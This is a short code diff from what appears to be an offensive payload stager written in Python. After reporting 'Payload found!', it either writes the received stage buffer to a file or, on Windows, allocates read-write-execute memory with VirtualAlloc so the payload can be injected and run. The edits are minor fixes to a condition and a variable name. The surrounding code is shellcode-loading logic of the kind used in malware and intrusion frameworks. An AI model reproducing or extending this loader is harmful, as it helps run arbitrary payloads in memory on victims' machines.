@@ -158,14 +158,14 @@ class module:
         #self.msg('proc.buf')
         m('mnote', 'Payload found!')
 
-        if self.save != '':
+        if self.save != None:
             with open(self.save, 'wb') as f: # type: ignore
                   f.write(stage_buffer)
             m('mok', f'File {self.save} saved')
             self.relay = True
 
 
-        if not self.relay and os.name == 'nt':
+        if not self.relay and osname == 'nt':
             ptr = VirtualAlloc(0, len(stage_buffer), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
             if ptr:
                 #self.msg('inj.alloc')
